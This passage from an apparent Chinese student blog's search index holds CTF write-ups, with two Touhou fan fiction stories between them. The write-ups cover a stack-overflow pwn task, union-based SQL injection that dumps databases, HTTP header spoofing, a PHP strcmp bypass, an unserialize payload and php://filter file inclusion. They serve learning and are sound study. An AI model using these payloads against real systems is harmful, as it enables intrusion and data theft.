(“/bin/sh)”这个可以相当于在远程主机上开了一个控制台，有这个就可以控制对方的主机。</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220216114832745-16449993634627.png" alt="图7"></p><p>可以输入的变量是上面的s。下面的s是RBP，r是返回地址。就是要利用上面是s覆盖掉下面的返回地址，返回到目标函数。</p><p>然后就是需要找目标函数的地址</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220216115101780-16449993634628.png" alt="图8"></p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/02/16/buu-rip/image-20220215173728001-16449993634629.png" alt="图9"></p><p>关于这个payload，如果不加前面的b，就会报错。TypeError: can only concatenate str (not “bytes”) to str</p><p>这个原因好像是因为python3的原因（可能）。</p><p>解决方法有两个，一个是在“a”前面加一个b，另一个是在p64(0x401186)后面加.decode(‘unicode_escape’)</p><p>但是第一种方法更简单。</p><p>这个remote是远程连接，里面的内容就是题目给出的需要连接的主机。</p><p>最重要的是构造payload，通过payload的内容，让程序执行到我们想要它到的地方。从而拿到控制权。</p><p>sendline是把上面的payload传递上去。</p><p>而interactive是让我们和主机交互。前面都是脚本代码和主机交互，接下来就变成我们和主机交互。</p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>其实怎么做出来这道题我认为并不重要，重要的是其实构造payload的时候，有两个payload都能成功。但是我的想法正好和这个不一样。15应该是数组的长度，但是后面还有覆盖8位的rbp。这样就变成了15+8，然后后面再加上地址。但是这样其实连不上。要么是上面那种情况可以成功，要么就是15+8后，目的地址加一。要么就是在目的地址前面还要加一个retn的地址。这让我完全没搞明白。参考了这个博客之后，我有了一些想法<a href="https://blog.csdn.net/weixin_44547827/article/details/120006420?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_default&amp;utm_relevant_index=1" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44547827/article/details/120006420?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_default&amp;utm_relevant_index=1</a></p><p>我认为实际上这个15+8这个逻辑是没有问题的，主要是因为这个是64位系统，需要地址对齐。而在目的地址前面再加一个地址，或者地址加一的效果，可能都是对齐地址的方法。而直接15的那个，不改8直接写地址的，可能也是能对齐地址。以上属于猜测，但我认为有可能是这样的。</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LoveSQL</title>
      <link href="/qiuyu.github.io/2022/01/16/lovesql/"/>
      <url>/qiuyu.github.io/2022/01/16/lovesql/</url>
      
        <content type="html"><![CDATA[<h3 id="第一步、用万能密码测试"><a href="#第一步、用万能密码测试" class="headerlink" title="第一步、用万能密码测试"></a>第一步、用万能密码测试</h3><p>面对sql题，第一步先试试万能密码，反正也没什么事。</p><p><strong>0’ or 1=1 #</strong></p><p>然后得到个这个</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/01/16/lovesql/image-20210920160404745.png" alt="图1"></p><p>虽然不知道是什么东西，但是可以登陆成功说明是有漏洞的。</p><h3 id="第二步、查字段数量"><a href="#第二步、查字段数量" class="headerlink" title="第二步、查字段数量"></a>第二步、查字段数量</h3><p>然后开始查字段的数量吧，只有知道字段的数量，才能用联合查询。</p><p><strong>0’ order by x #</strong> （x为数字，根据回显判断字段数量）</p><p>先试了试0’ order by 2 # 然后没有问题，3也没有问题。到4的时候变成了</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/01/16/lovesql/image-20210920161236927.png" alt="图2"></p><p>说明只有三个字段。</p><h3 id="第三步、爆库名"><a href="#第三步、爆库名" class="headerlink" title="第三步、爆库名"></a>第三步、爆库名</h3><p>用联合查询的时候，select后要跟三个内容，分别对应三个字段。</p><p>格式为：0’ union select 1,1,group_concat(table_schema) from information_schema.tables #</p><p>在这三个内容里面，只有最后一个查询table_schema才是我们想要的。table_schema就是库名。group_concat()可以把多条数据用逗号连接起来，作为一条数据输出。</p><p>而这个information_schema库中就包含了所有的信息</p><p>但需要注意的是，这样输出会输出很多名称重复的数据，我们可以用在table_schema前面加个distinct来消除重复行。完整语句是：</p><p><strong>0’ union select 1,1,group_concat(distinct table_schema) from information_schema.tables #</strong></p><p>得到下面的结果</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/01/16/lovesql/image-20210920160327350.png" alt="图3"></p><p>应该是在geek库</p><h3 id="第四步、爆表名"><a href="#第四步、爆表名" class="headerlink" title="第四步、爆表名"></a>第四步、爆表名</h3><p><strong>‘ union select 1,1,group_concat(distinct table_name) from information_schema.tables where table_schema=database() #</strong></p><p>得到表名geekuser和l0ve1ysq1</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/01/16/lovesql/image-20210920165434936.png" alt="图4"></p><h3 id="第五步、爆列名"><a href="#第五步、爆列名" class="headerlink" title="第五步、爆列名"></a>第五步、爆列名</h3><p><strong>0’ union select 1,1,group_concat(distinct column_name) from information_schema.columns where table_name=’l0ve1ysq1’ #</strong></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/01/16/lovesql/image-20210920165601070.png" alt="图5"></p><h3 id="第六步、爆数据"><a href="#第六步、爆数据" class="headerlink" title="第六步、爆数据"></a>第六步、爆数据</h3><p><strong>0’ union select 1,1,group_concat(id,username,password) from geek.l0ve1ysq1 #</strong></p><p>得到flag</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/01/16/lovesql/image-20210920170821001.png" alt="图5"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2022/01/16/lovesql/image-20210920170847727.png" alt="图6"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红魔馆的夜晚</title>
      <link href="/qiuyu.github.io/2021/10/16/hong-mo-guan-de-ye-wan/"/>
      <url>/qiuyu.github.io/2021/10/16/hong-mo-guan-de-ye-wan/</url>
      
        <content type="html"><![CDATA[<p>（多年前的外界，同样是一个静谧的夜晚）</p><p>  “这个交易，如何？”身穿紫色洋装的少女将手中的茶杯放下，缓缓地看向蕾米莉亚，微笑着说道。</p><p>  “八云紫，你们妖怪贤者都这么狂妄的么？”蕾米莉亚傲慢地看向八云紫，“高贵的吸血鬼是不会为了一处住所而去屈身帮你们的。”</p><p>  “只是各取所需而已嘛，”紫仍然慢条斯理地说道，“这样的结果对我们双方都有利哦。”</p><p>  “况且，你们也没有其它选择了吧。”八云紫用折扇挡住面部，眼睛直直地盯着蕾米莉亚。眼中虽仍有笑容，却已透出阵阵寒意。</p><p>  “呵！说白了是在威胁我罢了。”蕾米身后的翅膀渐渐张开，深红色的双眼毫无生机地看向八云紫。</p><p>  空气如同凝固一般，四周一片寂静…</p><p>  八云紫将折扇收起，叹了口气，平静地看向窗外：“只要能将目的达到，你用什么方法都是可以的哦。”</p><p>  “这段历史会被记载为‘吸血鬼入侵幻想乡，在最后时刻，妖怪贤者们击退了吸血鬼，并签署了契约。’没人会知道今天这场交易的。”紫似乎对更改历史的记录很有信心。</p><p>  “那，为什么找上我？”蕾米的翅膀缓缓收起，似乎对这件事产生了兴趣。</p><p>  “啊啦啊啦，”紫笑了笑，“安于现状，不愿改变。这一点，不论是人还是妖怪，果然还是一样的呢。不过，这种安逸的现状会毁了幻想乡的妖怪们也说不一定哦。虽然推行新的规则能够改变这一点，但是推进过程中还是有不少阻力呢。”</p><p>  “就是那个’符卡规则‘啊，相当无聊且华而不实呢。”蕾米并不满意这个答案。</p><p>  “在幻想乡，不需要拼个你死我活哦，华丽才是最重要的。”紫认真的回答道。</p><p>  蕾米心想：不需要你死我活么。</p><p>  “吸血鬼在妖怪中具有最高级别的魅力，由你们牵头使用符卡规则，想必会有不少妖怪追随，这样一来，推进过程就会快很多。”紫看向沉思中的蕾米。</p><p>  忽然，蕾米睁开眼睛，轻蔑地看向八云紫：“你就不怕——我真的占领幻想乡？”突然间，一层薄薄的红雾从房间四周向中间聚集，将八云紫包围住。红雾如同一双无形的手，缓缓伸向八云紫的咽喉。</p><p>  这时，八云紫忽然从房间中消失了。下一秒，紫出现在了蕾米身后。</p><p>  “是隙间！”蕾米心想。</p><p>  蕾米莉亚正准备站起来，八云紫的手就放在了蕾米肩上。“这就要看你的实力了。希望不会让我失望。”紫冷冷地说道。</p><p>  随后，紫将放在蕾米肩上的手放开，又恢复成了平时漫不经心的状态：“嘛，你先考虑一下吧。”随后，便又从房间中消失了。</p><p>  房间又回归了静谧。蕾米静静地看着桌子上的红茶… …</p>]]></content>
      
      
      <categories>
          
          <category> 小说 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 东方同人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>夜幕中的星火</title>
      <link href="/qiuyu.github.io/2021/10/04/ye-mu-zhong-de-xing-huo/"/>
      <url>/qiuyu.github.io/2021/10/04/ye-mu-zhong-de-xing-huo/</url>
      
        <content type="html"><![CDATA[<h3 id="序章"><a href="#序章" class="headerlink" title="序章"></a>序章</h3><p>太阳缓缓落下，夜幕逐渐笼罩了整座大山。星光微暗，凉风渐起，更添萧瑟氛围。只有蝉的叫声为这个场景增添了一点声响。在山顶的一处空地上，有一个女孩静静的坐在一个土堆旁边，一言不发，呆呆地看着天空。这里出奇的安静，似乎时间也凝滞住了。</p><p>村长死了，就埋在山顶。</p><p>宫疏晓不知道死了究竟是怎么回事。她只知道，这就意味着她再也不能扑入村长爷爷的怀抱里，再也看不到村长爷爷慈祥的微笑，在她受到欺负的时候，再也没有人替她说活了。“死”从她的身边夺走了她亲爱的村长爷爷。</p><p>比起难过，伤心，宫疏晓心里更多的是感到迷茫和害怕。这已经不是第一次“死”从她身边夺走亲人了。从她一出生，“死”就夺走了她的妈妈。在她记事之前，“死”又夺走了她的爸爸。她从小就在村长爷爷的照看下长大。曾经，她不止一次的去问村长爷爷，为什么“死”要从自己身边夺走爸爸妈妈，自己就再也见不到他们了吗…</p><p>曾经，每当这时，村长爷爷就会停下手里的工作，将宫疏晓搂在怀里，安慰她说道：”你的爸爸妈妈只是去了另一个世界，虽然你看不到他们，但他们仍然在默默注视着你，为你祝福呢。“</p><p>”可是，我听村里的人说，都是因为我出生在一个最不吉利的日子，才会导致爸爸妈妈的死亡。我就是那个最不幸，被神明厌恶的女孩。“宫疏晓想起村中人们看到自己时，厌恶的神情，不由地害怕的身体发抖。</p><p>”别听他们瞎说，死亡只是人生最终要经历的一件事罢了。你可是我们村子里的现任巫女，是神明的代言人，怎么会被神明厌恶呢。“村长安抚着宫疏晓。</p><p>”可是…我，我想爸爸妈妈了。“宫疏晓渐渐哭了出来。</p><p>“哎，”村长爷爷摸了摸宫疏晓的头发，“疏晓啊，人死是不能复生的。你只能慢慢习惯现在的生活，直到这份伤口被时间慢慢愈合。”</p><p>宫疏晓抬起头，泪眼婆娑地看着村长，眼神中充满迷茫。</p><p>“当你想爸爸妈妈的时候，就抬头看看天上的星星吧。这些星星就是你的爸爸妈妈和你连接的通道，在星星的另一头，你的爸爸妈妈也在默默注视着你。”村长轻抚着宫疏晓，默默看着天空。低头时，却发现宫疏晓已经睡着了。</p><p>习惯……么</p><p>曾经，宫疏晓以为自己已经习惯了，习惯没有父母的生活。可现在，村长也走了。她又要花多久才能习惯呢？</p><p>以前的日子里，只要自己遇到困难，向村长爷爷求助就一定能解决。可现在，村长爷爷也离她而去了。就如同在黑夜中，唯一的火把熄灭。在这黑暗之中，悲伤逐渐被迷茫和害怕所侵占。这种恐惧的情感使她胸口发闷，头晕目眩。她怕的想叫出声，可发现喉咙却什么声音都发不出来。只感受到自己在不断地坠落，跌入无底的深渊。</p><p>continue…</p>]]></content>
      
      
      <categories>
          
          <category> 小说 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小说 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大一凌睿招新wp</title>
      <link href="/qiuyu.github.io/2020/10/16/da-yi-ling-rui-zhao-xin-wp/"/>
      <url>/qiuyu.github.io/2020/10/16/da-yi-ling-rui-zhao-xin-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="（1）凌睿第二题"><a href="#（1）凌睿第二题" class="headerlink" title="（1）凌睿第二题"></a>（1）凌睿第二题</h3><p>主要是熟悉一下常见编码，找了个讲述比较全的博客<a href="https://blog.csdn.net/mdxiaohu/article/details/81318643#web%E5%89%8D%E7%AB%AF%E7%AE%80%E4%BB%8B" target="_blank" rel="noopener">https://blog.csdn.net/mdxiaohu/article/details/81318643#web%E5%89%8D%E7%AB%AF%E7%AE%80%E4%BB%8B</a> 从这里面知道了<!--注释-->是注释的意思。然后按F12我看到了在正常代码下面有一行注释，注释内容是一串乱码。所以我猜是加密过了。因为我之前知道的加密方式只有base64，所以我先试了试这个。然后就成了。还算简单。</p><h3 id="（2）凌睿第三题"><a href="#（2）凌睿第三题" class="headerlink" title="（2）凌睿第三题"></a>（2）凌睿第三题</h3><p>先下载了burp suite。然后在b站学了基本用法<a href="https://www.bilibili.com/video/BV1T7411m7KG" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1T7411m7KG</a> 然后就去指定网站抓包。其实就把前几章看了，更多的地方是直接在网上搜博客学怎么用burp suite的。</p><p>首先说这个网站，我最开始是完全懵的。还是先按F12，看代码，然后发现没什么用。于是就感觉好像必须用burp suite才能得到结果。这个过程中，我知道要设置代理服务器，设置完后，还要弄一个协议，才能在开着burp suite的情况下上网。</p><p>bp有两个功能是做这道题需要用到的，一个是proxy要抓包，另一个是repeater，抓过包之后，要把包送到这里，然后改包，send之后看response。</p><p>我最开始的时候，被hint的第一条内容吸引了。http请求头，是我首先去了解的，找了个比较全的<a href="https://blog.csdn.net/qq_42350419/article/details/82841192" target="_blank" rel="noopener">https://blog.csdn.net/qq_42350419/article/details/82841192</a> 学完之后，我以为flag在http请求头里，所以我对每一条都认真分析，看flag到底应该藏在哪里。最后我的注意力放到了cookie上，因为感觉这个东西会包含的信息会很多。于是，我就又去查cookie信息包含了什么。还有cookie信息怎么解读。但是找了一天毫无收获。</p><p>第二天我又这么干，不过这次我把第二天抓到的包的信息与第一天抓的进行对比。发现cookie不一样（惨）然后我突发奇想，我换一个浏览器，抓到的包信息会不会一样。于是我把Google和edge的结果进行对比，然后找到其中相同的地方，那么这些地方就应该是藏flag的地方（在走偏的路上越走越远)</p><p>之后我也看了不少ctf的题和解法，慢慢了解到我之前的想法是不对的。在某一次找题的时候，偶然看到了好像跟Referer有关。我就想到了网站上的那一句话You should come from “<a href="http://www.google.com&quot;" target="_blank" rel="noopener">www.google.com&quot;</a> 之前我一直不理解，然后我突然有想法：这是告诉我，我应该从谷歌来这个网页，于是写了一条：referer:<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> 然后返回的果然变了。说让我只能在本地看。</p><p>我把host改成127.0.0.1，但结果还是不对，然后就又卡了</p><p>直到我又刷到了一个博客<a href="https://blog.csdn.net/weixin_44953600/article/details/107515973?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44953600/article/details/107515973?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242</a></p><p>我要是早点找到这个就好了。从这个里面，我知道了我要加一句X-Forwarded-For ：127.0.0.1才算是本地访问。</p><p>然后就给我来了个“你需要用commodo浏览器”我在User-Agent中把浏览器改成了commodo，他就说这个是简称，我应该写全称。又卡了。</p><p>最后，我在谷歌搜索中找到了一个博客，上面写着Commodore 64是全称，我就试了试，最后终于成了。</p><p>真的是太不容易了，主要是最开始的思路走偏了，而且偏的很严重…也是之后看了数不清的有关ctf的博客，才把思路正回来。过程真的是太艰难了….</p><h3 id="（3）凌锐php第一题"><a href="#（3）凌锐php第一题" class="headerlink" title="（3）凌锐php第一题"></a>（3）凌锐php第一题</h3><p>实际上考察了strcmp()漏洞，strcmp比较两个字符串，如果str1小于str2返回&lt;0。如果str1大于str2返回&gt;0。如果相等返回0。因为比较的两者不是同一种类型，所以只会返回0，即结果是比较的两个东西相等。所以，需要绕过验证。绕过的方法是上传的b是一个数组或者一个object即可，但这个只能上传字符串类型，那么，就让b是数组就可以了。在网站后面加一个”?b[]=123”就表示b成了一个数组。然后结果就出来了。（用百度查了两天，没搞懂是怎么回事。用谷歌只用了早读不到半个小时就会了。）</p><p>参考网站：<a href="https://xz.aliyun.com/t/3085" target="_blank" rel="noopener">https://xz.aliyun.com/t/3085</a></p><h3 id="（4）凌锐php第二题"><a href="#（4）凌锐php第二题" class="headerlink" title="（4）凌锐php第二题"></a>（4）凌锐php第二题</h3><p>目前的想法是，flag藏在flag.php中,而__construct()中的命令会让file附上index.php。那么把file设为flag.php,调用__destruct()，并且绕过__construct。应该找到php序化然后用base64编码一下，写到网站后面就行了。但是，我还不知道怎么做。而且好像失败了。</p><p>终于做出来了。</p><p>说一下我的想法，这个是先创建了一个类，Hit。然后这个类里面有两个public变量。还有最重要的是有__construct()和__destruct()。</p><p>__construct是在对象创建时调用此方法。在后面if语句中创建了一个变量str，__construct被调用，file被赋值为”index.php”。flag在flag.php所以要想办法把file赋值改成”flag.php”，得到flag是需要__destruct，因为这个函数会转达process，转到process才有可能输出flag。所以先说如何能用到__destruct。</p><p>__destruct是对象被销毁时执行。而对象被销毁，就要用到反序列化了。那就是if中的unserialize。这里面有一个GET[su29029]所以是要获取su29029的内容。将这个内容赋给变量str。然后在反序列化变量str。</p><p>然后就要说到，到process中之后，应该怎么做。这里面有两个判断。先判断content是不是”Hello World”是的话输出”?”但这个不是我们想要的。我们要这个判断是假，然后进入下一个判断。判断content是不是su29029。是的话，就输出flag。并且注释里说的很明确，flag在flag.php。所以任务就很明确了。</p><p>先创建一个类，命名为Hit，创建两个public变量file和content。file赋值flag.php，content赋值su29029。对这个类序列化得到结果。大致这样：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Hit</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'su29029'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到结果：O:3:”Hit”:2:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}</p><p>然后在网页后写上“?su29029=O:3:”Hit”:2:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}”答案就出来了。</p><p>这道题没有加__wakeup()函数，算是降低难度了，__wakeup()是在反序列化字符串时调用。绕过的方法就是改变对象属性的个数。也就是O:3:”Hit”:<strong>2</strong>:{s:4:”file”;s:8:”flag.php”;s:7:”content”;s:7:”su29029”;}中的”2”改为”3”</p><p>这道题的两个变量是public类型的，使用比较简单。如果是private类的，那么就需要加%00，即%00类的名字%00属性名字 %00Hit%00file</p><h3 id="（5）凌锐Linux题："><a href="#（5）凌锐Linux题：" class="headerlink" title="（5）凌锐Linux题："></a>（5）凌锐Linux题：</h3><p>现在有个想法，因为可能与vim有关，所以可能是关于“备份文件”的。vim会自动保存swp后缀的备份文件。如果下载到源文件，可能能拿到flag。另一个问题是，题目中还提到了一个robot，这可能是robot协议。是跟网页有关的。感觉会和解题有关。</p><p>用御剑扫描一下网站，扫出来了robots.txt。点开网站<a href="http://v8.su29029.xyz:10005/robots.txt" target="_blank" rel="noopener">http://v8.su29029.xyz:10005/robots.txt</a></p><p>发现有</p><pre class="line-numbers language-html"><code class="language-html">User-agent: *Disallow: /fl4g_1s_h3re.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把 /fl4g_1s_h3re.php放在网站后面，成<a href="http://v8.su29029.xyz:10005/fl4g_1s_h3re.php" target="_blank" rel="noopener">http://v8.su29029.xyz:10005/fl4g_1s_h3re.php</a></p><p>结果网站显示了Can you find out the flag?</p><p>看来还需要一些步骤。</p><p>这一回，我直接在robots.txt后面加/fl4g_1s_h3re.php，结果显示Access denied。<a href="http://v8.su29029.xyz:10005/robots.txt/fl4g_1s_h3re.php" target="_blank" rel="noopener">http://v8.su29029.xyz:10005/robots.txt/fl4g_1s_h3re.php</a></p><p>题目中说“机器人恶意删除了我的vim编辑器”所以我猜这一句话的意思是，vim编辑器意外退出产生临时文件swp。所以我应该找到并下载这个文件。经过不断在网站后面加.swp后缀后，这个文件不知道什么时候就下载下来了。挺突然的…..然后才知道，这个是要在根目录的路径是在10005/后直接加”.index.php.swp”即<a href="http://v8.su29029.xyz:10005/.index.php.swp" target="_blank" rel="noopener">http://v8.su29029.xyz:10005/.index.php.swp</a></p><p>记住swp这类隐藏文件在调用时前面要加一个“.”</p><p>然后就是把这个文件移动到Linux系统里，用vim编辑器，输入“vim -r index.php.wsp”修复这个文件，然后就出现了代码：</p><meta charset="utf8"><?phpecho "Do you like linux and robot?";error_reporting(0);$file = $_GET["file"];if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){        exit('hacker!');}if($file){        include($file);}?><p>好吧，又该看代码了。这个是文件包含漏洞。通过php函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意代码注入</p><p>这里需要绕过stristr函数，这个东西把好多php伪协议过滤了。</p><p>不过留了一个php://filter没过滤。所以就需要用这个。</p><p>？file=php://filter/read=convert.base64-encode/resource=fl4g_1s_h3re.php</p><p>得到base64编码后的字符串，再用base64解码器解一下，flag就出来了。</p><p>参考网站：<a href="https://blog.csdn.net/qq_42181428/article/details/87090539" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/87090539</a></p><h3 id="（6）凌锐sql注入第一题"><a href="#（6）凌锐sql注入第一题" class="headerlink" title="（6）凌锐sql注入第一题"></a>（6）凌锐sql注入第一题</h3><p>先用万能密码(0’ or 1=1 – )试一下得到了用户名Aione密码er_ci_yuan，显然没什么用…</p><p>第一步：看有多少字段，输一个1’order by 3 – ，显示找不到。输一个“0’ order by 2 – ”，然后显示没问题。所以应该是有两个字段。</p><p>第二步：爆库名<br>‘ union select 1,group_concat(table_schema) from information_schema.tables #<br>得到这个<br>Login success, your flag is flag{<strong>***</strong>}<br>Your login name is:1<br>Your password is:information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema,information_schema<br>加一个消除处重复行<br>‘ union select 1,group_concat(<strong>distinct</strong> table_schema) from information_schema.tables #<br>得到<br>Login success, your flag is flag{<strong>***</strong>}<br>Your login name is:1<br>Your password is:easy_sql,information_schema<br>这个easy_sql应该就包含了flag。库名就是easy_sql</p><p>第三步：表名<br>‘ union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=’easy_sql’ #<br>‘ union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=database() #</p><p>上面两种都行</p><p>得到<br>Login success, your flag is flag{<strong>***</strong>}<br>Your login name is:1<br>Your password is:easy_sql,fl4g<br>表fl4g,sc</p><p>第四步：列<br>‘ union select 1,group_concat(distinct column_name) from information_schema.columns where table_name=’fl4g’ #<br>得到<br>Login success, your flag is flag{<strong>***</strong>}<br>Your login name is:1<br>Your password is:flag<br>得到列：flag</p><p>第五步：查flag<br>‘union select 1,group_concat(flag) from easy_sql.fl4g #<br>得到<br>Login success, your flag is flag{<strong>***</strong>}<br>Your login name is:1<br>Your password is:lrstudio{0h_you_ar3_g00d_1t_my5q1i}</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
